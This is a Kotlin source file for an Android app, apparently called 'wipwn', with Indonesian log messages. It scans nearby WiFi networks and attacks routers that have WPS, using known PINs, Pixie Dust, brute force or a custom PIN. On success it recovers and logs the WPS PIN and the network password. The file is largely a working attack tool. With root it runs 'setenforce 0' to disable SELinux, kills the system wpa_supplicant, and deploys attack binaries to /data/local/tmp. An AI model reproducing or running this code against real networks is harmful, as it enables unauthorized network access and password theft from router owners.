package com.wipwn.app.repository

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import android.os.SystemClock
import androidx.core.content.ContextCompat
import com.wipwn.app.data.AttackConfig
import com.wipwn.app.data.AttackError
import com.wipwn.app.data.AttackHistoryStore
import com.wipwn.app.data.AttackResult
import com.wipwn.app.data.AttackType
import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.util.RootUtil
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.withContext
import kotlinx.coroutines.sync.Mutex
import sangiorgi.wps.lib.ConnectionUpdateCallback
import sangiorgi.wps.lib.WpsConnectionManager
import sangiorgi.wps.lib.models.NetworkToTest
import kotlin.coroutines.resume

/**
 * Central business-logic layer. Replaces the monolithic ViewModel: every
 * screen-level VM talks to this repository instead of touching the library,
 * shell or DataStore directly.
 *
 * Lifecycle: created once in [com.wipwn.app.WipwnApp] and shared across all
 * ViewModels. [shutdown] is not called by the app (matches
 * [android.app.Application] lifetime) but is available for tests.
 */
class WpsRepository(
    private val appContext: Context,
    private val shell: ShellExecutor,
    private val historyStore: AttackHistoryStore,
    private val scope: CoroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
) {
    private val attackLock = Mutex()
    // ── Init state ─────────────────────────────────────────────────────

    data class InitState(
        val isRooted: Boolean = false,
        val isChecking: Boolean = true,
        val isLibraryReady: Boolean = false,
        val error: String? = null
    )

    private val _initState = MutableStateFlow(InitState())
    val initState: StateFlow<InitState> = _initState.asStateFlow()

    // ── Cross-screen selection ─────────────────────────────────────────

    private val _selectedNetwork = MutableStateFlow<WifiNetwork?>(null)
    val selectedNetwork: StateFlow<WifiNetwork?> = _selectedNetwork.asStateFlow()

    fun selectNetwork(network: WifiNetwork) { _selectedNetwork.value = network }
    fun clearSelection() { _selectedNetwork.value = null }

    // ── Persistent history ─────────────────────────────────────────────

    val history: Flow<List<AttackResult>> = historyStore.history

    // ── WPS library ────────────────────────────────────────────────────

    private var wpsManager: WpsConnectionManager? = null

    /** Probe root + initialise the WPS library. Re-runnable (retry). */
    fun initialize() {
        scope.launch { doInitialize() }
    }

    private suspend fun doInitialize() {
        _initState.value = InitState(isChecking = true)

        val rooted = withContext(Dispatchers.IO) { RootUtil.isRooted() }
        if (!rooted) {
            _initState.value = InitState(
                isRooted = false,
                isChecking = false,
                error = "Perangkat tidak memiliki akses root!"
            )
            return
        }

        try {
            val manager = WpsConnectionManager(appContext)
            withContext(Dispatchers.IO) {
                manager.initialize().get()
                manager.awaitReady()
            }
            wpsManager = manager
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = true
            )
        } catch (e: Exception) {
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = false,
                error = "Gagal inisialisasi WPS library: ${e.message}"
            )
        }
    }

    // ── Scanning ───────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    suspend fun scanNetworks(): Result<List<WifiNetwork>> = runCatching {
        ensureScanPrerequisites()
        val wifi = appContext.applicationContext
            .getSystemService(Context.WIFI_SERVICE) as WifiManager

        wifi.startScan()
        withContext(Dispatchers.IO) { Thread.sleep(SCAN_WAIT_MS) }

        val results = wifi.scanResults ?: emptyList()
        results
            .filter { it.BSSID != null }
            .map { it.toWifiNetwork() }
            .sortedByDescending { it.rssi }
    }

    // ── Attacks ────────────────────────────────────────────────────────

    /**
     * Events emitted during an attack. Exposed as a SharedFlow so multiple
     * VMs / UI pieces can subscribe without replays interfering.
     */
    sealed interface AttackEvent {
        data class Log(val line: String) : AttackEvent
        data class Progress(val message: String, val totalPins: Int) : AttackEvent
        data class PinCountDelta(val delta: Int) : AttackEvent
        data class SessionStarted(val sessionId: String) : AttackEvent
        data class Finished(val result: AttackResult) : AttackEvent
    }

    private val _attackEvents = MutableSharedFlow<AttackEvent>(
        replay = 0,
        extraBufferCapacity = 128
    )
    val attackEvents: kotlinx.coroutines.flow.SharedFlow<AttackEvent> = _attackEvents.asSharedFlow()

    /**
     * Run an attack. Suspends until finished. Guaranteed to emit exactly one
     * [AttackEvent.Finished] before returning.
     */
    suspend fun runAttack(
        network: WifiNetwork,
        type: AttackType,
        customPin: String? = null,
        config: AttackConfig = AttackConfig()
    ): AttackResult {
        val sessionId = "S-${System.currentTimeMillis()}"
        _attackEvents.emit(AttackEvent.SessionStarted(sessionId))
        emitTaggedLog("guard", "Session: $sessionId")

        if (!attackLock.tryLock()) {
            val busy = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.Unknown("Masih ada serangan aktif, tunggu sampai selesai")
            )
            _attackEvents.emit(AttackEvent.Finished(busy))
            historyStore.add(busy)
            return busy
        }

        ensureAttackPrerequisites()?.let { guardError ->
            val blocked = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = guardError
            )
            _attackEvents.emit(AttackEvent.Finished(blocked))
            historyStore.add(blocked)
            attackLock.unlock()
            return blocked
        }

        val manager = wpsManager ?: run {
            val r = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.NoRoot("WPS library belum siap")
            )
            _attackEvents.emit(AttackEvent.Finished(r))
            historyStore.add(r)
            attackLock.unlock()
            return r
        }

        // Prepare environment
        emitTaggedLog("prepare", "Menyiapkan environment...")
        val prepResult = withContext(Dispatchers.IO) { prepareEnvironment() }
        if (prepResult is EnvPrep.Failed) {
            val r = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.EnvironmentFailed(prepResult.reason)
            )
            _attackEvents.emit(AttackEvent.Finished(r))
            historyStore.add(r)
            attackLock.unlock()
            return r
        }
        val startedAt = SystemClock.elapsedRealtime()
        val result = withTimeoutOrNull(config.attackTimeoutMs) {
            awaitAttack(manager, network, type, customPin, config)
        } ?: run {
            manager.cancel()
            emitTaggedLog("guard", "Watchdog timeout ${config.attackTimeoutMs}ms, cancel attack")
            val timeoutResult = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.Unknown("Timeout: serangan terlalu lama, dibatalkan watchdog")
            )
            _attackEvents.emit(AttackEvent.Finished(timeoutResult))
            historyStore.add(timeoutResult)
            timeoutResult
        }
        emitTaggedLog("result", "Session selesai dalam ${SystemClock.elapsedRealtime() - startedAt}ms")
        if (attackLock.isLocked) attackLock.unlock()
        return result
    }

    private suspend fun awaitAttack(
        manager: WpsConnectionManager,
        network: WifiNetwork,
        type: AttackType,
        customPin: String?,
        config: AttackConfig
    ): AttackResult = suspendCancellableCoroutine { cont ->
        val finished = java.util.concurrent.atomic.AtomicBoolean(false)
        val sideJobs = mutableListOf<Job>()
        val logcatProcRef = java.util.concurrent.atomic.AtomicReference<Process?>(null)

        fun stopSideJobs() {
            sideJobs.forEach { it.cancel() }
            sideJobs.clear()
            logcatProcRef.getAndSet(null)?.let { p ->
                runCatching { p.destroy() }
            }
        }

        fun finish(r: AttackResult) {
            if (!finished.compareAndSet(false, true)) return
            stopSideJobs()
            scope.launch {
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
            }
            if (cont.isActive) cont.resume(r)
        }

        cont.invokeOnCancellation {
            finished.set(true)
            stopSideJobs()
            runCatching { manager.cancel() }
        }

        val callback = object : ConnectionUpdateCallback {
            override fun create(title: String, message: String, progress: Int) {
                emitTaggedLog("run", "▶ $message")
                emitEvent(AttackEvent.Progress(message, progress))
            }
            override fun updateMessage(message: String) {
                emitTaggedLog("run", "  $message")
                emitEvent(AttackEvent.Progress(message, -1))
            }
            override fun updateCount(increment: Int) {
                emitEvent(AttackEvent.PinCountDelta(increment))
            }
            override fun error(message: String, type: Int) {
                val err = AttackError.fromLibraryErrorType(type, message)
                emitTaggedLog("result", "✗ ${err.message}")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = err
                    )
                )
            }
            override fun success(networkToTest: NetworkToTest, isRoot: Boolean) {
                val pin = networkToTest.pins?.firstOrNull()
                val pass = networkToTest.password
                emitTaggedLog("result", "✓ BERHASIL! PIN: ${pin ?: "-"}")
                if (!pass.isNullOrEmpty()) emitTaggedLog("result", "✓ Password: $pass")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = pass,
                        success = true
                    )
                )
            }
            override fun onPixieDustSuccess(pin: String, password: String) {
                emitTaggedLog("pixie", "✓ Pixie Dust BERHASIL!")
                emitTaggedLog("pixie", "✓ PIN: $pin")
                if (password.isNotEmpty()) emitTaggedLog("pixie", "✓ Password: $password")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = password,
                        success = true
                    )
                )
            }
            override fun onPixieDustFailure(error: String) {
                emitTaggedLog("pixie", "✗ Pixie Dust gagal: $error")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.PixieDustNotVulnerable(error)
                    )
                )
            }
        }

        if (type == AttackType.PIXIE_DUST) {
            narratePixieDustPlan(network)
            sideJobs += scope.launch { pixieDustHeartbeat() }
            sideJobs += scope.launch { tailLibraryLogcat(logcatProcRef) }
        }

        scope.launch {
            runCatching {
                when (type) {
                    AttackType.KNOWN_PINS -> manager.testPins(
                        network.bssid, network.ssid, config.knownPins.toTypedArray(), callback
                    )
                    AttackType.PIXIE_DUST -> manager.pixieDust(
                        network.bssid, network.ssid, callback
                    )
                    AttackType.BRUTE_FORCE -> manager.bruteForce(
                        network.bssid, network.ssid, config.bruteForceDelayMs, callback
                    )
                    AttackType.CUSTOM_PIN -> {
                        val pin = customPin ?: return@runCatching
                        manager.testPins(network.bssid, network.ssid, arrayOf(pin), callback)
                    }
                }
            }.onFailure { e ->
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.Unknown("Exception: ${e.message}", e)
                    )
                )
            }
        }
    }

    // ── Pixie Dust instrumentation ─────────────────────────────────────
    //
    // The underlying library does NOT call create()/updateMessage() during
    // the Pixie Dust flow — it only emits onPixieDustSuccess/Failure at the
    // very end. That left our UI log silent for ~25-30s while wpa_supplicant
    // spins up, WPS-M1/M3 gets captured and pixiewps crunches DH keys.
    //
    // To give the user live visibility we now:
    //   1. Emit an explicit plan before kick-off describing every phase.
    //   2. Run a heartbeat ticker that keeps the log alive every few
    //      seconds with the current elapsed time.
    //   3. Tail Android logcat for the tags the library itself writes to
    //      (PixieDustExecutor, WpsExecutor, WpsNative, ConnectionService,
    //      ConnectionHandler) and forward those lines into the event flow.

    private fun narratePixieDustPlan(network: WifiNetwork) {
        emitTaggedLog("pixie", "═══ Pixie Dust attack mulai ═══")
        emitTaggedLog("pixie", "Target SSID : ${network.ssid}")
        emitTaggedLog("pixie", "Target BSSID: ${network.bssid}  (ch ${network.channel})")
        emitTaggedLog("pixie", "Rencana yang bakal dijalanin library:")
        emitTaggedLog("pixie", "  1. Spawn wpa_supplicant (root) di wlan0 + ctrl socket")
        emitTaggedLog("pixie", "  2. Wait ~2s buat association ke AP")
        emitTaggedLog("pixie", "  3. WPS-REG pake dummy PIN 12345670 → mancing M1-M3")
        emitTaggedLog("pixie", "  4. Extract E-Nonce / PKE / PKR / AuthKey / E-Hash1 / E-Hash2 (timeout 20s)")
        emitTaggedLog("pixie", "  5. Offline crack PIN via pixiewps (exploit RNG lemah)")
        emitTaggedLog("pixie", "  6. Re-connect pake PIN yang ketemu → ambil PSK")
        emitTaggedLog("pixie", "Kalo step 4 gagal → router ga vulnerable. Itu bukan bug app.")
        emitTaggedLog("pixie", "──────────────────────────────")
    }

    private suspend fun pixieDustHeartbeat() {
        val start = SystemClock.elapsedRealtime()
        // delay() throws CancellationException when the parent job is
        // cancelled (which finish() does via stopSideJobs), so the loop
        // exits cleanly without checking isActive manually.
        while (true) {
            delay(PIXIE_HEARTBEAT_MS)
            val elapsed = (SystemClock.elapsedRealtime() - start) / 1000
            val phase = when {
                elapsed < 3 -> "booting wpa_supplicant"
                elapsed < 6 -> "associating ke AP + WPS-REG dummy PIN"
                elapsed < 26 -> "nangkep handshake (E-Hash1/2, E-Nonce, PKE/PKR)"
                else -> "cracking PIN via pixiewps / verify PSK"
            }
            emitTaggedLog("pixie", "⏳ ${elapsed}s — $phase")
        }
    }

    private suspend fun tailLibraryLogcat(
        procRef: java.util.concurrent.atomic.AtomicReference<Process?>
    ) = withContext(Dispatchers.IO) {
        runCatching { shell.exec("logcat -c") }

        val tags = listOf(
            "PixieDustExecutor",
            "WpsExecutor",
            "WpsNative",
            "ConnectionService",
            "ConnectionHandler",
            "WpsConnectionManager"
        )
        val filter = tags.joinToString(" ") { "$it:V" } + " *:S"
        // Spawn a dedicated `su` process so we can destroy() it the moment
        // the attack finishes, instead of blocking libsu's cached shell.
        val process = runCatching {
            ProcessBuilder("su", "-c", "logcat -v brief $filter")
                .redirectErrorStream(true)
                .start()
        }.getOrElse { e ->
            emitTaggedLog("lib", "logcat spawn failed: ${e.message}")
            return@withContext
        }
        procRef.set(process)

        runCatching {
            process.inputStream.bufferedReader().use { reader ->
                while (true) {
                    val line = reader.readLine() ?: break
                    if (line.isBlank()) continue
                    val cleaned = line.substringAfter("): ", line).trim()
                    if (cleaned.isNotEmpty()) emitTaggedLog("lib", cleaned)
                }
            }
        }.onFailure { e ->
            // Reader closes when process.destroy() is called — that's
            // expected, so only log genuine IO issues.
            if (procRef.get() != null) {
                emitTaggedLog("lib", "logcat tail error: ${e.message}")
            }
        }
    }

    private fun emitEvent(event: AttackEvent) {
        // tryEmit is safe because we have extraBufferCapacity.
        _attackEvents.tryEmit(event)
    }

    private fun emitTaggedLog(stage: String, message: String) {
        emitEvent(AttackEvent.Log("[${stage.lowercase()}] $message"))
    }

    fun cancelAttack() {
        wpsManager?.cancel()
    }

    suspend fun clearHistory() = historyStore.clear()

    fun shutdown() {
        wpsManager?.cleanup()
        wpsManager?.shutdown()
        wpsManager = null
    }

    // ── Environment prep ───────────────────────────────────────────────

    private sealed interface EnvPrep {
        data object Ok : EnvPrep
        data class Failed(val reason: String) : EnvPrep
    }

    private fun prepareEnvironment(): EnvPrep {
        return try {
            emitEvent(AttackEvent.Log("[1/7] Setting SELinux permissive..."))
            shell.exec("setenforce 0")

            emitEvent(AttackEvent.Log("[2/7] Stopping system wpa_supplicant..."))
            shell.exec("killall wpa_supplicant 2>/dev/null")
            shell.exec("killall -9 wpa_supplicant 2>/dev/null")
            Thread.sleep(1000)

            val nativeLibDir = appContext.applicationInfo.nativeLibraryDir
            emitEvent(AttackEvent.Log("[3/7] nativeLibDir: $nativeLibDir"))

            val check = shell.exec("ls -la $nativeLibDir/libwpa_supplicant_exec.so 2>&1")
            if (!check.isSuccess) {
                emitEvent(AttackEvent.Log("  wpa_supplicant binary: NOT FOUND"))
                emitEvent(AttackEvent.Log("  ls output: ${check.combined}"))

                val found = shell.exec(
                    "find /data/app -name 'libwpa_supplicant_exec.so' 2>/dev/null | head -1"
                ).out.firstOrNull()
                if (found == null) {
                    emitEvent(AttackEvent.Log("  ERROR: Cannot find wpa_supplicant binary anywhere!"))
                    return EnvPrep.Failed("wpa_supplicant binary tidak ditemukan")
                }
                val actualLibDir = found.substringBeforeLast("/")
                emitEvent(AttackEvent.Log("  Found at: $actualLibDir"))
                return prepareWithLibDir(actualLibDir)
            }
            emitEvent(AttackEvent.Log("  wpa_supplicant binary: FOUND"))
            prepareWithLibDir(nativeLibDir)
        } catch (e: Exception) {
            emitEvent(AttackEvent.Log("ERROR: ${e.message}"))
            EnvPrep.Failed(e.message ?: "unknown")
        }
    }

    private fun prepareWithLibDir(libDir: String): EnvPrep {
        return try {
            val filesDir = appContext.filesDir.absolutePath

            emitEvent(AttackEvent.Log("[4/7] Deploying binaries to /data/local/tmp/wpswpa/..."))
            val deploy = shell.exec(
                "mkdir -p /data/local/tmp/wpswpa",
                "cp '$libDir/libwpa_supplicant_exec.so' /data/local/tmp/wpswpa/libwpa_supplicant_exec.so",
                "cp '$libDir/libwpa_cli_exec.so' /data/local/tmp/wpswpa/libwpa_cli_exec.so",
                "cp '$libDir/libpixiewps_exec.so' /data/local/tmp/wpswpa/libpixiewps_exec.so",
                "chmod 755 /data/local/tmp/wpswpa/*"
            )
            emitEvent(AttackEvent.Log("  Deploy: ${if (deploy.isSuccess) "OK" else "FAILED"}"))
            if (!deploy.isSuccess) emitEvent(AttackEvent.Log("  ${deploy.stderr}"))

            val verify = shell.exec("ls -la /data/local/tmp/wpswpa/")
            emitEvent(AttackEvent.Log("  Files: ${verify.out.joinToString(", ")}"))

            val ctrlDir = if (Build.VERSION.SDK_INT >= 28) {
                "/data/vendor/wifi/wpa/wpswpatester"
            } else {
                "/data/misc/wifi/wpswpatester"
            }
            emitEvent(AttackEvent.Log("[5/7] Creating ctrl dir: $ctrlDir"))
            shell.exec(
                "mkdir -p $ctrlDir",
                "chmod 770 $ctrlDir",
                "chown wifi:wifi $ctrlDir 2>/dev/null || true"
            )

            emitEvent(AttackEvent.Log("[6/7] Creating wpa_supplicant.conf..."))
            shell.exec("mkdir -p $filesDir")
            shell.exec(
                "printf 'ctrl_interface=DIR=$ctrlDir GROUP=wifi\nupdate_config=0\n' > $filesDir/wpa_supplicant.conf"
            )
            shell.exec("chmod 644 $filesDir/wpa_supplicant.conf")

            shell.exec("rm -f /data/local/tmp/wpa_ctrl_* 2>/dev/null")
            shell.exec("rm -f $ctrlDir/* 2>/dev/null")

            emitEvent(AttackEvent.Log("[7/7] Finding WiFi interface..."))
            val iface = shell.exec("ls /sys/class/net/ | grep -E 'wlan|wifi|wl' | head -1")
                .out.firstOrNull() ?: "wlan0"
            emitEvent(AttackEvent.Log("  Interface: $iface"))

            val ifaceCheck = shell.exec("ip link show $iface 2>&1")
            emitEvent(AttackEvent.Log("  Interface status: ${if (ifaceCheck.isSuccess) "UP" else "DOWN/MISSING"}"))

            emitEvent(AttackEvent.Log("✓ Environment ready"))
            EnvPrep.Ok
        } catch (e: Exception) {
            emitEvent(AttackEvent.Log("ERROR: ${e.message}"))
            EnvPrep.Failed(e.message ?: "unknown")
        }
    }

    private fun ensureScanPrerequisites() {
        val wifi = appContext.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (!wifi.isWifiEnabled) throw IllegalStateException("WiFi lagi mati. Nyalain dulu.")
        if (!hasLocationPermission()) throw IllegalStateException("Permission lokasi belum dikasih.")
        if (Build.VERSION.SDK_INT >= 33 && !hasNearbyWifiPermission()) {
            throw IllegalStateException("Permission Nearby WiFi belum dikasih.")
        }
        if (!isLocationServiceEnabled()) {
            throw IllegalStateException("Location service harus ON buat scan WiFi.")
        }
    }

    private fun ensureAttackPrerequisites(): AttackError? {
        if (!_initState.value.isLibraryReady) {
            return AttackError.NoRoot("Library WPS belum siap.")
        }
        return runCatching {
            ensureScanPrerequisites()
            null
        }.getOrElse { AttackError.EnvironmentFailed(it.message ?: "Prerequisite gagal") }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(
            appContext, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(
            appContext, Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    private fun hasNearbyWifiPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            appContext, Manifest.permission.NEARBY_WIFI_DEVICES
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isLocationServiceEnabled(): Boolean {
        val lm = appContext.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return false
        return runCatching {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        }.getOrDefault(true)
    }

    // ── Helpers ────────────────────────────────────────────────────────

    @Suppress("DEPRECATION")
    private fun ScanResult.toWifiNetwork(): WifiNetwork {
        val caps = this.capabilities ?: ""
        val wpsEnabled = caps.contains("[WPS", ignoreCase = true)
        val freq = this.frequency
        val channel = when {
            freq in 2412..2484 -> (freq - 2412) / 5 + 1
            freq in 5170..5825 -> (freq - 5170) / 5 + 34
            else -> 0
        }
        return WifiNetwork(
            bssid = this.BSSID ?: "",
            ssid = this.SSID ?: "",
            rssi = this.level,
            frequency = freq,
            channel = channel,
            capabilities = caps,
            wpsEnabled = wpsEnabled,
            wpsLocked = false
        )
    }

    companion object {
        private const val SCAN_WAIT_MS = 2000L
        private const val PIXIE_HEARTBEAT_MS = 3000L
    }
}
